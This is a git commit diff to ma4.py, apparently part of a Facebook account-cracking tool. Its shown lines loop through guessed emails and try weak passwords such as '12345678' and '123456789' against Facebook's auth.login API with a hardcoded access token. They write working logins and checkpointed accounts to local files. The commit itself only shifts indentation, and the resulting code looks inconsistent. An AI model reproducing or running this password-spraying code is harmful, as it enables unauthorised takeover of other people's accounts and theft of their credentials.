d6f42bb8e6325c7546967fd3eb7e0cd2ed4f81d6
Mahdi Hasan Shuvo <98658558+Shuvo-BBHH@users.noreply.github.com>
2022-04-14 16:05:11 +0600

    Update ma4.py

--- ma4.py
+++ ma4.py
@@ -253,8 +253,8 @@ def action():
  					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
  					        cps.close()
  					        cpb.append(c+user+pass2)
-                                  else:
- 			                   pass3="12345678"
+                                                         else:
+ 			                pass3="12345678"
  				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				            q = json.load(data)
  				            if 'access_token' in q:
@@ -270,7 +270,7 @@ def action():
  					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
  					                cps.close()
  					                cpb.append(c+user+pass3)
-                                              else:
+                              else:
  				                    pass4="123456789"
  				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				                    q = json.load(data)
@@ -280,7 +280,7 @@ def action():
  				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
  				                        okb.close()
  				                        oks.append(c+user+pass4)
- 				                    else:
+ 				                  else:
  				                        if 'www.facebook.com' in q['error_msg']:
  					                        print '\033[1;97m[MAHDI 7 DAYS] ' + k + c + user + '  》  ' + pass4+'\n═════════════════════════════════════════════'
  					                        cps = open('save/checkpoint.txt', 'a')
